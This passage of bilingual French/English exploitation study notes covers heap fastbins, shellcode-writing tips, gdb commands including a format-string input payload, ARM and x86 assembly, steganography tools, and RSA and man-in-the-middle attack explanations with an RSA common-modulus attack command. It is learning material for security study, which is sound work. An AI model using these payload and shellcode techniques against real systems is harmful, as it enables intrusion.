    > non-inline metadata, consisting primarily of the heads of each of
    > those free lists I mentioned.**

> **A single arena can administrate multiple heaps.**
>
> **A new arena is created along with an initial heap every time a
> thread uses malloc for the first time, up to a limit based on the
> number of available cores.**
>
> **The main thread gets a special arena called the main arena, which
> resides in the libc data section.**

![](media/image82.png){width="7.17466426071741in"
height="5.058395669291339in"}

**Fonctionnement des fastbins :**

![](media/image350.png){width="7.695497594050743in"
height="6.8650481189851265in"}

-   l'attaque :

![](media/image359.png){width="5.791338582677166in"
height="1.4166666666666667in"}

## MISC

-   S﻿OURCE FORTIFY : remplacement de fonctions dangereuses par sa
    > version sécurisée: strcpy=\>strncpy.

```{=html}
<!-- -->
```
-   ﻿NX : la pile et le tas d\'un programme NON exécutables..

```{=html}
<!-- -->
```
-   0x90 : instruction NOP.

```{=html}
<!-- -->
```
-   Un ShellCode peut être stocké dans une variable d'environnement à la
    > place d'être écrit directement dans un buffer car ca prendra moin
    > de place dans le "payload".

```{=html}
<!-- -->
```
-   Pour les programmeurs, des overflows peuvent aussi apparaître dans
    > des boucles for ou while s'il y a des erreurs avec les indices ou
    > dans la condition de la boucle par exemple.

> Ces overflows peuvent être très difficiles à détecter. Ces bugs sont
> appelés off-by-one bugs car ils peuvent avoir lieu seulement sur un ou
> quelques bytes.
>
> Il faut noter que ces bugs off-by-one sur certains programmes compilés
> avec gcc sont peut-être inexploitables. Les versions 3.x de gcc
> ajoutent un padding entre les variables locales et
>
> frame pointer ce qui rend ce dernier inaccessible à un off-by-one bug.

-   Dans le processus d'écriture d'un shellcode :

    -   Il y a le fait de réduire leur taille au minimum dans la mémoire
        > afin de l'utiliser dans des petits buffers.

```{=html}
<!-- -->
```
-   Enlever les bytes NULL car ils agissent comme des terminateurs pour
    > les strings.

```{=html}
<!-- -->
```
-   Le shellcode doit être PIC ( position independent code ), c-à-dire
    > il ne doit contenir aucune adresse absolue car l'adresse où le
    > shellcode est exécuté est généralement pas connue.

![](media/image318.png){width="8.25225612423447in"
height="6.149025590551181in"}

#  Gdb command

-   **disass \[FUNCTION\] : produce the disassembly output of the entire
    > function.**

```{=html}
<!-- -->
```
-   **set disassembly-flavor \[ att - intel \] : Controls the
    > disassembly style used by the
    > [disassemble](https://visualgdb.com/gdbreference/commands/disassemble)
    > and [x](https://visualgdb.com/gdbreference/commands/x) commands.**

> **att : AT&T disassembly style**
>
> **intell : Intel disassembly style**

-   **show disassembly-flavor : print the disassembly style used.**

```{=html}
<!-- -->
```
-   **layout split : Display the source and assembly window.**

```{=html}
<!-- -->
```
-   **i r \| info registers = prints the main registers.**

```{=html}
<!-- -->
```
-   **x/20xw \$esp : Tip to print the stack .**

    -   **w = 16 bits**

    -   **x = Hex**

```{=html}
<!-- -->
```
-   **Clear : remove breakpoints.**

```{=html}
<!-- -->
```
-   **p \[ register \] : print the content of the register.**

```{=html}
<!-- -->
```
-   **reverse-stepi : revenir un pas en arrière.**

```{=html}
<!-- -->
```
-   **call \[function name\] : call a function inside the binary.**

```{=html}
<!-- -->
```
-   **set {char}0x080486fc=0x74 = change la valeur a l'adresse
    > 0x080486fc.**

-   **print/x \[REGISTER\] = Print the value of the register.**

-   **print (char\*) 0x555555556004**

```{=html}
<!-- -->
```
-   **define hook-stop : makes the associated commands ( to the hook )
    > execute every time execution stops in your program: before
    > breakpoint commands are run, displays are printed, or the stack
    > frame is printed.**

> **Example of a hook:**
>
> ![](media/image33.png){width="2.1041666666666665in"
> height="0.8645833333333334in"}

-   **bt = Montre l'empilement des frames sur la piles.**

-   **i f = Donne des informations sur la frame actuelle.**

-   **i f n = Donne des informations sur la frame numéro n.**

```{=html}
<!-- -->
```
-   **find Start_address,end_address,pattern = trouve le pattern entre
    > les 2 adresses de début et fin.**

```{=html}
<!-- -->
```
-   **run \< \<(python -c \"print \'%121x\' +
    > \'\\x86\\xfd\\xff\\xbf\'\") : Formater un input sur GDB avec
    > python.**

```{=html}
<!-- -->
```
-   **info files : Display what different segments are there in the core
    > file.**

```{=html}
<!-- -->
```
-   **x/30s \*((char \*\*)environ) : Afficher les adresses des variables
    > d'environnements.**

```{=html}
<!-- -->
```
-   **To switch a flag on the statue register (here GDB syntax):**

    -   **0 -\> 1 OR: ﻿set (\$eflags) \|=
        > 0x\[BIT_VALUE_ON_STATUE_REGISTER\]**

    -   **1 -\> 0 XOR: set (\$eflags) \^=
        > 0x\[BIT_VALUE_ON_STATUE_REGISTER\]**

```{=html}
<!-- -->
```
-   **Technique pour trouver l'offset jusqu\'à EIP avec gdb-peda :**

> ![](media/image209.png){width="4.541666666666667in"
> height="0.6041666666666666in"}

![](media/image148.png){width="5.572916666666667in"
height="0.4166666666666667in"}

> ![](media/image1.png){width="3.21875in" height="1.5520833333333333in"}

-   **find \[BEGIN_ADD\], \[AND_ADD\], \[VALUE\] : search for value
    > between address**

**Example : find 0x555555554000 to 0x555555558fff, "Hello, world!"**

-   Technique pour trouver le main dans un binaire stripped :

    -   1\) info file pour voir ou se trouve .txt

    -   2\) disass \[DEBUT .TXT\], \[FIN .TXT\]

```{=html}
<!-- -->
```
-   1\) break \_libc_start_main

-   2\) run and check the first argument of this function. this is where
    > the main start

```{=html}
<!-- -->
```
-   

# ARM

-   ## Differents instructions

![](media/image430.png){width="5.791338582677166in"
height="4.347222222222222in"}

  -----------------------------------------------------------------------
  **cpy r0, r2**                      **mov r0, r2**
  ----------------------------------- -----------------------------------
  **bcs \[ADDRESS\]**                 **Jump avec CS condition**

  -----------------------------------------------------------------------

+----------------------------------+-----------------------------------+
| Move R2 ,#4                      | R2 = #4                           |
+==================================+===================================+
| B ( Branch )                     | Simple Jump ( up to 32 MB )       |
+----------------------------------+-----------------------------------+
| BL ( Branch and Link )           | Preserves the addresses of the    |
|                                  | instruction after the branch ( in |
|                                  | LR )                              |
+----------------------------------+-----------------------------------+
| BX ( Branch and Exchange )       | Uses the content of a             |
|                                  | general-purpose register to       |
|                                  | decide where to jump and exchange |
|                                  | instruction set.                  |
+----------------------------------+-----------------------------------+
| ldr r0, addr_var1                | Load to R0 the value stored in    |
|                                  | addr_var1.                        |
+----------------------------------+-----------------------------------+
| str r2, \[r1, #2\]               | Store the value found in r2 to    |
|                                  | the memory address found in r1+2. |
|                                  | R1 stay unmodified                |
+----------------------------------+-----------------------------------+
| str r2, \[r1, #2\]!              | Store the value found in r2 to    |
|                                  | the memory address found in r1+2. |
|                                  | R1 is modified : r1 = r1 + 2      |
+----------------------------------+-----------------------------------+
| ldr r3, \[r1\], #4               | load the value found in memory    |
|                                  | address found in r1 to r3. R1 is  |
|                                  | modified : r1 = r1 + 4            |
+----------------------------------+-----------------------------------+
| str r2, \[r1,+ r2, LSL#2\]       | Store the value found in r2 to    |
|                                  | the memory address found in r1+(  |
|                                  | r2 left-shifted by 2 ). R1 stay   |
|                                  | unmodified                        |
+----------------------------------+-----------------------------------+
| ldr r0, =jump                    | load the address of the function  |
|                                  | label jump into r0                |
+----------------------------------+-----------------------------------+
| ldr r1, =0x68DB00AD              | load the value 0x68DB00AD into r1 |
+----------------------------------+-----------------------------------+
| adr r0, words+12                 | address of words\[3\] -\> r0      |
+----------------------------------+-----------------------------------+
| ldm r0, {r4, r5}                 | \[r4\]= \[r0\]                    |
|                                  |                                   |
|                                  | \[r5\]= \[r0 + 4\]                |
+----------------------------------+-----------------------------------+
| stm r1, {r4, r5}                 | \[r1\] = \[r4\] ,                 |
|                                  |                                   |
|                                  | \[r1 + 4\] = \[r5\]               |
+----------------------------------+-----------------------------------+
| ldmia r0, {r4-r6}                | \[r4\] = \[r0\]                   |
|                                  |                                   |
|                                  | \[r5\] = \[r0 + 4\]               |
|                                  |                                   |
|                                  | \[r6\] = \[r0 + 8\]               |
+----------------------------------+-----------------------------------+
| stmia r0, {r4-r6}                | \[r0\] = \[r4\]                   |
|                                  |                                   |
|                                  | \[r0 + 4\] = \[r5\]               |
|                                  |                                   |
|                                  | \[r0 + 8\] = \[r6\]               |
+----------------------------------+-----------------------------------+
| ldmib r0, {r4-r6}                | \[r4\] = \[r0 + 4\]               |
|                                  |                                   |
|                                  | \[r5\] = \[r0 + 8\]               |
|                                  |                                   |
|                                  | \[r6\] = \[r0 + 12\]              |
+----------------------------------+-----------------------------------+
| stmib r0, {r4-r6}                | \[r0 + 4\] = \[r4\]               |
|                                  |                                   |
|                                  | \[r0 + 8\] = \[r5\]               |
|                                  |                                   |
|                                  | \[r0 + 12\] = \[r6\]              |
+----------------------------------+-----------------------------------+
| ldmda r0, {r4-r6}                | \[r6\] = \[r0\]                   |
|                                  |                                   |
|                                  | \[r5\] = \[r0 - 4\]               |
|                                  |                                   |
|                                  | \[r4\] = \[r0 - 8\]               |
+----------------------------------+-----------------------------------+
| ldmdb r0, {r4-r6}                | \[r6\] = \[r0 - 4\]               |
|                                  |                                   |
|                                  | \[r5\] = \[r0 - 8\]               |
|                                  |                                   |
|                                  | \[r4\] = \[r0 - 12\]              |
+----------------------------------+-----------------------------------+
| stmda r0, {r4-r6}                | \[r0\] = \[r6\]                   |
|                                  |                                   |
|                                  | \[r0 - 4\] = \[r5\]               |
|                                  |                                   |
|                                  | \[r0 - 8\] = \[r4\]               |
+----------------------------------+-----------------------------------+
| stmdb r0, {r4-r6}                | \[r0 - 4\] = \[r6\]               |
|                                  |                                   |
|                                  | \[r0 - 8\] = \[r5\]               |
|                                  |                                   |
|                                  | \[r0 - 12\] = \[r4\]              |
+----------------------------------+-----------------------------------+

-   **R13 : Stack pointer ( like ESP ).**

```{=html}
<!-- -->
```
-   **R14 ( LR ) : Link register ( function like EIP ).**

```{=html}
<!-- -->
```
-   **R15 : PC register.**

```{=html}
<!-- -->
```
-   **R11 : Pointer to the current frame ( FP, like EBP ).**

```{=html}
<!-- -->
```
-   **R12 : Can be corrupted with temporary data in a called
    > subroutine.**

```{=html}
<!-- -->
```
-   **R0 -\> R3 : Hold function arguments.**

##  CPSR

-   **CPSR : register for operating processor status. It contains 2 bits
    > that encode whether ARM inst., Thumb inst., or Jazelle opcodes are
    > being executed.**

![](media/image310.png){width="6.270833333333333in" height="2.125in"}

![](media/image420.png){width="6.270833333333333in"
height="4.638888888888889in"}

![](media/image122.png){width="5.432292213473316in"
height="1.5548950131233596in"}

## condition codes :

> ![](media/image415.png){width="4.570086395450569in"
> height="5.848958880139983in"}

##  

## 

## 

##  MISC

-   ARM processors have two main states they can operate in (let's not
    > count Jazelle here), ARM and Thumb.

```{=html}
<!-- -->
```
-   Differences between ARM & Thumb :

    -   Instructions in ARM : 32-bit and Thumb : 16-bit (can be 32).

    -   All instructions in ARM state support conditional execution

    -   32-bit Thumb instructions have a .w suffix

```{=html}
<!-- -->
```
-   ARM can only load a 8-bit value in one go.

> A full immediate value v is given by the formula: v = n ror 2\*r
>
> because of the restriction in immediate value : 12 bits for this field
>
> In ARM instruction.

-   In x86, we use PUSH and POP to load and store from and onto the
    > Stack. In ARM, we can use these two instructions ( Pop/Push and
    > Load/Store ).

# Assembleur x86

> ![](media/image348.png){width="4.885416666666667in"
> height="1.6666666666666667in"}

-   **In addition to the GPRs, EIP, and EFLAGS, there are also registers
    > that control important low-level system mechanisms such as virtual
    > memory, interrupts, and debugging.**

> **For example:**

-   **CR0 controls whether paging is on or off.**

```{=html}
<!-- -->
```
-   **CR2 contains the linear address that caused a page fault.**

-   **CR3 is the base address of a paging data structure.**

```{=html}
<!-- -->
```
-   **CR4 controls the hardware virtualization settings.**

-   **DR0--DR7 are used to set memory breakpoints.**

```{=html}
<!-- -->
```
-   **When the operating system transitions from ring 3 to ring 0, it
    > saves state information on the stack.**

-   **EFLAGS register : like CPSR in ARM.**

-   **Little and big endian :**

> ![](media/image205.png){width="2.3020833333333335in"
> height="1.1145833333333333in"}

-   **Instruction CALL \[address\] = PUSH "EIP" + Jump \[address\].**

-   **Instruction LEAVE :**

> **EN résumé : MOVE ESP , EBP**
>
> **POP EBP**

-   **Instruction PUSH \[ REGISTRE \]: Pousse l'argument passé à PUSH au
    > sommet de la pile et La valeur contenue dans ESP est mise sur le
    > dessus de la pile.**

```{=html}
<!-- -->
```
-   **Instruction POP \[ REGISTRE \] : Retire l'élément au sommet de la
    > pile et l'assigne à la valeur passée en argument. Le registre ESP
    > qui pointe sur le sommet pointe à présent sur la valeur précédente
    > sur la pile.**

-   **Appel d'une fonction en assembleur :**

**en résumé : push \[ \],**

> **push \[ \],**
>
> **\...**

**call \[ \]**

-   **Prologue d'une fonction en assembleur :**

    -   **en résumé : push %ebp,**

> **mov %esp, %ebp**
>
> **sub \[\$0x.. \], %esp**

-   **Epilogue d'une fonction en assembleur :**

    -   **en résumé : leave ( ESP = EBP, remettre l'ancien EBP )**

> **ret ( POP eip )**

**Exemples d'instructions en x86**

+--------------------------------+-------------------------------------+
| **ROR**                        | **Rotation vers la droite**         |
+================================+=====================================+
| **ROL**                        | **Rotation vers la gauche**         |
+--------------------------------+-------------------------------------+
| **INT X**                      | **Generate the interruption X (     |
|                                | "system_call" in linux )**          |
+--------------------------------+-------------------------------------+
| **XOR EBX,EBX**                | **Restore the EAX register**        |
+--------------------------------+-------------------------------------+
| **movl                         |                                     |
| 0x80848c48(%ebx,%ecx,4), %eax  |                                     |
| ( Syntaxe AT&T )**             |                                     |
+--------------------------------+-------------------------------------+
| **movl (%esi), %eax ( Syntaxe  | **EAX = \*ESI ( pointeur )**        |
| AT&T )**                       |                                     |
+--------------------------------+-------------------------------------+
| **movb %bl, (%edi) ( Syntaxe   | **\*EDI = bl ( sur seulement un     |
| AT&T )**                       | octet car "movb" )**                |
+--------------------------------+-------------------------------------+
| **int \$0x80 ( Syntaxe AT&T    | **interruption du programme (       |
| )**                            | return )**                          |
+--------------------------------+-------------------------------------+
| **movl entier, %eax ( Syntaxe  | **eax = entier ( qui est une        |
| AT&T )**                       | constante définie dans *data* )**   |
+--------------------------------+-------------------------------------+
| **movb tableau(%esi), %al (    | **AL = \*tableau + ESI**            |
| Syntaxe AT&T )**               |                                     |
+--------------------------------+-------------------------------------+
| **shl eax, 8**                 | **Shift left 8-bits**               |
+--------------------------------+-------------------------------------+
| **shr eax, 8**                 | **Shift right 8-bits**              |
+--------------------------------+-------------------------------------+
| **movsd**                      | **Special *mov* instruction :       |
|                                | implicitly use EDI/ESI as the       |
|                                | destination/source address,         |
|                                | respectively.**                     |
|                                |                                     |
|                                | **Usually Use to copy/paste         |
|                                | string.**                           |
|                                |                                     |
|                                | **In addition, they also            |
|                                | automatically update the            |
|                                | source/destination address          |
|                                | depending on the direction flag     |
|                                | (DF) in EFLAGS.**                   |
|                                |                                     |
|                                | **DF = 0 : the addresses are        |
|                                | decremented**                       |
|                                |                                     |
|                                | **DF = 1 : the addresses are        |
|                                | incremented**                       |
|                                |                                     |
|                                | **In some cases, they are           |
|                                | accompanied by the REP prefix (*rep |
|                                | movsd)*, which repeats an           |
|                                | instruction up to ECX times.**      |
+--------------------------------+-------------------------------------+
| **lea edi, \[ebx+170h\]**      | **edi = ebx+0x170 ( direct value of |
|                                | ebx )**                             |
+--------------------------------+-------------------------------------+
| **mov esi, offset              | **ESI = pointer to                  |
| \_RamsdiskBoot**               | RamdiskBootDiskGuid**               |
+--------------------------------+-------------------------------------+
| **SCAS ( pour comparaison )**  | **SCAS implicitly compares          |
|                                | AL/AX/EAX**                         |
|                                |                                     |
|                                | **with data starting at the memory  |
|                                | address EDI.**                      |
|                                |                                     |
|                                | **EDI is automatically              |
|                                | incremented/**                      |
|                                |                                     |
|                                | **decremented depending on the DF   |
|                                | bit in EFLAGS.**                    |
|                                |                                     |
|                                | **SCAS is commonly used along with  |
|                                | the REP prefix to find a byte,      |
|                                | word, or double-word in**           |
|                                |                                     |
|                                | **a buffer.**                       |
|                                |                                     |
|                                | **This instructions can operate at  |
|                                | 1-, 2-, or 4-byte granularity ( b,w |
|                                | or d suffix ).**                    |
|                                |                                     |
|                                | **Example :**                       |
|                                |                                     |
|                                | **"repne scasb"**                   |
|                                |                                     |
|                                | -   **Repeatedly scan forward one   |
|                                |     > byte at a time as long as AL  |
|                                |     > ( one byte ) does not match   |
|                                |     > the byte at EDI.**            |
+--------------------------------+-------------------------------------+
| **STOS ( pour écrire )**       | **STOS is the same as SCAS except   |
|                                | that it writes the value AL/AX/EAX  |
|                                | to EDI with ECX used as counter     |
|                                | with the loop instruction           |
|                                | "*rep*".**                          |
|                                |                                     |
|                                | **It is commonly used to initialize |
|                                | a buffer to a constant value.**     |
+--------------------------------+-------------------------------------+
| **LODS**                       | **It reads a 1-, 2-, or 4-byte**    |
|                                |                                     |
|                                | **value from ESI and stores it in   |
|                                | AL, AX, or EAX.**                   |
+--------------------------------+-------------------------------------+

-   **En AT&T, Les constantes en base**

> **16 commençant par 0x et les constantes en binaire par 0b.**

-   **Le système d'exploitation met à la disposition du**

> **programmeur un ensemble de routines ( exemple : *int \$0x80* qui
> provoque un *return* ) pour que chacun ne soit pas obligé de les
> réécrire à chaque fois. La valeur placée dans EAX détermine le choix
> de la routine utilisée.**

-   **le code retour d'un programme x86 est souvent la valeur**

> **placée dans EBX.**
>
> **Utilisation des registres sur un Syscall**
>
> ![](media/image117.png){width="4.96875in"
> height="0.6145833333333334in"}

-   **Les adresses des routines correspondant à toutes les interruptions
    > sont stockées dans une zone de la**

> **mémoire dite table des vecteurs d\'interruption.**
>
> **Chaque type d'interruption est associé à une case de cette table qui
> contient simplement l'adresse de la routine à exécuter.**

-   **A x86 processor can operate in two modes: real and protected.**

> **Real mode is the processor state when it is first powered on and
> only supports a 16-bit instruction set.**
>
> **Protected mode is the processor state supporting virtual memory,
> paging, and other features; it is the state in which modern operating
> systems execute.**

-   **x86 supports the concept of privilege separation through an
    > abstraction called *ring level*.**

> **The processor supports four ring levels, numbered from 0 to 3 (Rings
> 1 and 2 are not commonly used).**
>
> **Ring 0 is the highest privilege level and can modify all system
> settings. Ring 3 is the lowest privileged level and can only
> read/modify a subset of system settings.**
>
> **The ring level is encoded in the CS register.**

-   **Opération Multiplication :**

    -   **Le produit de 2 nombres de 32 bits occupe 64 bits. Dans tous
        > les cas, les 32 bits de poids fort seront placées dans EDX.**

```{=html}
<!-- -->
```
-   **Pour la multiplication non signée, la syntaxe est:**

> ***mul \<opérande\>.***
>
> **The register is multiplied with AL, AX, or EAX and the result is
> stored in AX, DX:AX, or EDX:EAX, depending on the operand width :**
>
> **Example :**
>
> **mul ecx ; EDX:EAX = EAX \* ECX**
>
> **mul cl ; AX = AL \* CL**
>
> **mul dx ; DX:AX = AX \* DX**

-   **Pour la multiplication signée, il y trois syntaxes :**

> ![](media/image329.png){width="3.5208333333333335in"
> height="0.7291666666666666in"}
>
> **Taille des opérande en AT&T :**

![](media/image221.png){width="5.71875in" height="1.8645833333333333in"}

**Conditional Jump in
x86**![](media/image216.png){width="6.536458880139983in"
height="6.927083333333333in"}

![](media/image259.png){width="7.223958880139983in"
height="1.6511909448818898in"}

> **Quelques Bits du Registre d'état et instructions**

+--------------------------------+-------------------------------------+
| **ZF (zero flag)**             | **Positionnée par une opération     |
|                                | arithmétique**                      |
|                                |                                     |
|                                | **( égal à zéro ) ou une            |
|                                | comparaison en cas d'égalité (mais  |
|                                | pas par un déplacement).**          |
+================================+=====================================+
| **CF (carry flag)**            | **Positionné par une opération      |
|                                | arithmétique lorsque le résultat    |
|                                | dépasse la taille**                 |
|                                |                                     |
|                                | **de registre concerné.**           |
|                                |                                     |
|                                | **exemple :**                       |
|                                |                                     |
|                                | **si on ajoute 2 registres de 8     |
|                                | bits, contenant 0xFF et 1, le       |
|                                | résultat (en théorie 0x100)**       |
|                                |                                     |
|                                | **vaut 0 donc CF est positionnée    |
|                                | (ZF aussi dans ce cas la)**         |
+--------------------------------+-------------------------------------+
| **SF (sign flag)**             | **Positionnée par une opération     |
|                                | arithmétique dont le résultat est   |
|                                | négatif ou une**                    |
|                                |                                     |
|                                | **comparaison dans le cas ou le 1er |
|                                | opérande est le plus grand (mais    |
|                                | pas par un déplacement).**          |
|                                |                                     |
|                                | **exemple : si on soustrait 2       |
|                                | registres de 8 bits, contenant 0x1F |
|                                | et 0x20, le résultat ( -1) vaut     |
|                                | OxFF donc SF est positionnée.**     |
+--------------------------------+-------------------------------------+
| **OF (overflow flag)**         | **Indique qu'un calcul a débordé    |
|                                | sur le bit de signe. exemple : si   |
|                                | on ajoute**                         |
|                                |                                     |
|                                | **2 registres de 8 bits, contenant  |
|                                | 0x7A et 0x21, le résultat vaut OxFF |
|                                | (donc -1) ;**                       |
|                                |                                     |
|                                | **OF est alors positionnée. (SF     |
|                                | aussi). Si on considère que les     |
|                                | nombres sont signées, OF indique    |
|                                | bien un problème.**                 |
|                                |                                     |
|                                | **Si on les considère non signés,   |
|                                | OF est inutile.**                   |
+--------------------------------+-------------------------------------+
|                                |                                     |
+--------------------------------+-------------------------------------+

-   **EFLAGS ( or ps ) ( current state of the processor ) in x86:**

**general-purpose registers in x86 and x86-64:**

![](media/image51.png){width="6.270833333333333in" height="1.0in"}

![](media/image104.png){width="6.270833333333333in"
height="1.0972222222222223in"}

##  MISC

-   The x86 architecture has 8 General-Purpose Registers (GPR), 6
    > Segment Registers, 1 Flags Register and an Instruction Pointer.
    > 64-bit x86 has additional registers.

```{=html}
<!-- -->
```
-   EAX, EBX, ECX, EDX, ESI, EDI = general-purpose registers.

> Rouge = Registres d'adresses.
>
> Il est à noter que rien n'interdit à un registre d'adresse de contenir
> une donnée (et vice-versa).

# Stéganographie

-   **Parfois , les premiers bits des images (LSB) sont utilisés pour
    > stocker des données.**

##  Steganography tools

+-----------------------------------+----------------------------------+
| [**[http                          | **Website where you can submit a |
| s://fotoforensics.com/]{.underlin | JPEG or PNG file for Forensic or |
| e}**](https://fotoforensics.com/) | stegano analysis.**              |
+===================================+==================================+
| [**[https://hexed.it/]{           | **The powerful online hex        |
| .underline}**](https://hexed.it/) | analysis and editor.**           |
+-----------------------------------+----------------------------------+
| [**[htt                           | **Try to find a hidden text      |
| ps://stylesuxx.github.io/steganog | message in an image.**           |
| raphy/]{.underline}**](https://st |                                  |
| ylesuxx.github.io/steganography/) |                                  |
+-----------------------------------+----------------------------------+
| **https://aperisolve.fr/**        | **Very great site for image      |
|                                   | analysis**                       |
+-----------------------------------+----------------------------------+
| **zsteg**                         | **Detect stegano-hidden data in  |
|                                   | PNG & BMP**                      |
|                                   |                                  |
|                                   | ![](media/image401.p             |
|                                   | ng){width="2.8958333333333335in" |
|                                   | height="1.9861111111111112in"}   |
+-----------------------------------+----------------------------------+
| **peepdf**                        | **Outil d\'analyse de pdf (avec  |
|                                   | un mode interactif) Très utile   |
|                                   | pour tracer les liens des        |
|                                   | catalogues, stream, objects,     |
|                                   | \...**                           |
+-----------------------------------+----------------------------------+
| **pdf-parser**                    | **Utile pour parser/analyser des |
|                                   | fichiers PDF**                   |
+-----------------------------------+----------------------------------+
| **pdf-parser \--stats             | **Voir si il y a des objet       |
| \[PDF_FILE\]**                    | cachée dans le PDF**             |
+-----------------------------------+----------------------------------+
| **pdf-parser \--object \[NUMBER\] | **extract object from PDF**      |
| \--raw \--filter \[PDF_FILE\]**   |                                  |
+-----------------------------------+----------------------------------+
| **zip -FF \[ZIP_FILE\] \--out     | **check the file and fix it if   |
| \[ZIP_FILE\]**                    | needed**                         |
+-----------------------------------+----------------------------------+
|                                   |                                  |
+-----------------------------------+----------------------------------+
|                                   |                                  |
+-----------------------------------+----------------------------------+
|                                   |                                  |
+-----------------------------------+----------------------------------+

##  Some useful commands

+---------------------------------+------------------------------------+
| **strings \[OPTIONS\]           | **Prints the strings of printable  |
| \[FILENAME\]**                  | characters in files ( by           |
|                                 | defaults,﻿print character sequences |
|                                 | that are at least 4 characters     |
|                                 | long ) .**                         |
|                                 |                                    |
|                                 | **﻿If you want, you can change this |
|                                 | limit using the -n command line    |
|                                 | option:**                          |
|                                 |                                    |
|                                 | **strings -n 2 test \<- 2          |
|                                 | characters**                       |
+=================================+====================================+
| **﻿**                            | **reads the complete file (and not |
|                                 | just loadable, initialized data    |
| **strings -a test**             | sections), use the -a command line |
|                                 | option.**                          |
+---------------------------------+------------------------------------+
| **hexdump \[FILENAME\]**        | **Allow you to print out the file  |
|                                 | in hex format.**                   |
+---------------------------------+------------------------------------+
| **exiftool \[IMAGE_NAME\]**     | **Print metadata of the image**    |
+---------------------------------+------------------------------------+
|                                 |                                    |
+---------------------------------+------------------------------------+
|                                 |                                    |
+---------------------------------+------------------------------------+

# Cryptographie

##  Cryptography tools

  ----------------------------------------------------------------------------------------------------------------------------------
  [**[https://8gwifi.org/rsafunctions.jsp]{.underline}**](https://8gwifi.org/rsafunctions.jsp)   **RSA Encryption / Decryption ( by
                                                                                                 providing Public/Private Key )**
  ---------------------------------------------------------------------------------------------- -----------------------------------
  **﻿[[http://www.factordb.com/]{.underline}](http://www.factordb.com/)**                         **Try to Factorize number**

                                                                                                 

                                                                                                 
  ----------------------------------------------------------------------------------------------------------------------------------

##  Useful Commands

+-----------------------------------+-----------------------------------+
| **openssl rsa -in pubkey.pem      | **extract Modulus ( in hexa ) and |
| -pubin -text -modulus**           | Exponent from the provided RSA    |
|                                   | public key.**                     |
+===================================+===================================+
| **openssl rsautl -decrypt -in     | **Decrypt with a RSA private      |
| \[FILE_WITH_CRYPTED_DATA\] -out   | key**                             |
| ./decrypt.txt -inkey              |                                   |
| private.pem**                     |                                   |
+-----------------------------------+-----------------------------------+
| **python3 RsaCtfTool.py           | **Generate a public key from n et |
| \--createpub -n \[NUMBER\] -e     | e ( with RsaCtfTool )**           |
| \[NUMBER\]**                      |                                   |
+-----------------------------------+-----------------------------------+
| **python3 rsa-cm.py -c1           | **RSA common modulus attack avec  |
| \[MSG_CHIFFRE1\] -c2              | rsa-cm.py**                       |
| \[MSG_CHIFFRE2\] -k1 \[KEY1_PUB\] |                                   |
| -k2**                             | **Sachant que les deux messages   |
|                                   | clairs sont les mêmes.**          |
| **\[KEY2_PUB\]**                  |                                   |
+-----------------------------------+-----------------------------------+
| **openssl rsa -in \[KEY_PUB\]     | **Afficher module exposant d'une  |
| -pubin -text -noout**             | clef publique**                   |
+-----------------------------------+-----------------------------------+
| **openssl rsautl -in              | **Encrypt with public Key**       |
| \[INPUT_FILE\] -out               |                                   |
| \[OUTPUT_FILE\] -pubin -inkey     |                                   |
| \[PUBKEY\] -encrypt**             |                                   |
+-----------------------------------+-----------------------------------+
| **openssl rsa -in mykey.pem       | **extract public key from private |
| -pubout \> mykey.pub**            | key**                             |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

## Catégorisation d\'algorithmes cryptographique

  -----------------------------------------------------------------------
  **Algorithme symétrique**           **AES, RC5, DES, Triple DES,
                                      Blowfish, Serpent, Twofish**
  ----------------------------------- -----------------------------------
  **Algorithme asymétrique**          **RSA, DSA, El gamal**

  -----------------------------------------------------------------------

  -----------------------------------------------------------------------
  **Chiffrement par Bloc ( M est      **DES, Triple DES, AES, RC6, RC5,
  traité par blocs de données )**     IDEA, BLOWFISH, RSA**
  ----------------------------------- -----------------------------------
  **Chiffrement par flot ( M est      **RC4, Bluetooth E0/1, GSM A5/1**
  traité bit par bit )**              

  **Différent mode opératoire**       **ECB, CBC, GCM, CCM, CTR, XTS**
  -----------------------------------------------------------------------

-   **El gamal =\> basé sur le logarithme discret**

##  Taille de différents Hash :

  -----------------------------------------------------------------------
  **MD5**                             **16 octets ( 32 caractères )**
  ----------------------------------- -----------------------------------
  **SHA-1**                           **20 octets ( 40 caractères )**

  **SHA-224**                         **28 octets ( 56 caractères )**

  **SHA-256**                         **32 octets ( 64 caractères )**

  **SHA-384**                         **48 octets ( 96 caractères )**

  **SHA-512**                         **64 octets ( 128 caractères )**
  -----------------------------------------------------------------------

**En général, les condensats sont écrits en Hexa.**

-   ## Man In The Middle 

    -   **Cas normal ( sans attaque )**

        -   **1** - Alice **et Bob échangent leur clé publique. Charles
            > peut les lire, il connaît donc *kapublic* et *kbpublic*.**

        -   **2** - Si **Alice veut envoyer un** message à Bob, **elle
            > chiffre ce message avec kbpublic. Bob le déchiffre avec
            > *kbprivate*.**

        -   **3** - Charles, **qui ne possède que *kbpublic*, ne peut
            > pas lire le message.**

    -   **Attaque : Admettons maintenant que Charles soit en mesure de
        > modifier les échanges entre Alice et Bob:**

        -   **1 -- Bob envoie sa clé publique à Alice. Charles
            > l'intercepte et renvoie à Alice sa propre clé publique
            > *kcpublic* en se faisant passer pour Bob.**

        -   **2 -- Lorsque Alice veut envoyer un message à Bob, elle
            > utilise donc, sans le savoir, la clé de Charles.**

        -   **3 -- Alice chiffre le message avec la clé publique**

> **de Charles et l'envoie à celui qu'elle croit être Bob.**

-   **4 -- Charles intercepte le message, le déchiffre avec sa clé
    > privée *kcprivate* et peut lire le message.**

-   **5 -- Puis il chiffre de nouveau le message avec la clé publique de
    > Bob *kbpublic*, après l'avoir éventuellement modifié.**

-   **6 -- Bob déchiffre son message avec sa clé privée et ne se doute
    > de rien puisque cela fonctionne.**

> **Ainsi, Alice et Bob sont chacun persuadés d'utiliser la clé de
> l'autre, alors qu'ils utilisent en réalité tous les deux la clé de
> Charles.**
>
> **Dans un cas réel , un attaquant peut être par exemple un routeur.**

-   ## RSA :

### Intro :

-   **The idea of RSA is based on the fact that it is difficult to
    > factorize a large integer.**

**The public key consists of two numbers where one**

> **number is multiplication of two large prime numbers.**
>
> **And private** keys are **also derived from the same two prime**
> **numbers.**
>
> **﻿So if somebody can factorize the large number ( multiplication of
> two large prime numbers ), the private** key is compromised**.**

-   **Encryption strength totally lies on the key size and if we double
    > or triple the key size, the strength of encryption increases
    > exponentially.**

